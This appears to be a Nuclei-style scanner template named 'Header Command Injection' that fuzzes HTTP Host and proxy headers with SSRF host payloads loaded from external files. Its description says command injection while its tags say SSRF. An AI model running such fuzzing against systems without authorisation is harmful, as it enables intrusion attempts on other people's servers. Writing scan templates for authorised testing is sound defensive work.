id: ssrf-header-injection
info:
  author: nullrabbit
  description: Fuzzing headers for command injection
  name: Header Command Injection
  severity: high
  tags: fuzz,ssrf
requests:
- attack: clusterbomb
  matchers:
  - status:
    - 200
    type: status
  payloads:
    header: helpers/payloads/proxy-headers.txt
    payload: helpers/payloads/ssrf-hosts.txt
  raw:
  - "GET / HTTP/1.1\nHost: \xA7payload\xA7\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64;\
    \ rv:68.0) Gecko/20100101 Firefox/68.0\nConnection: close\n"
  - "GET / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64;\
    \ rv:68.0) Gecko/20100101 Firefox/68.0\n\xA7header\xA7 \xA7payload\xA7\nConnection:\
    \ close\n"
  threads: 10
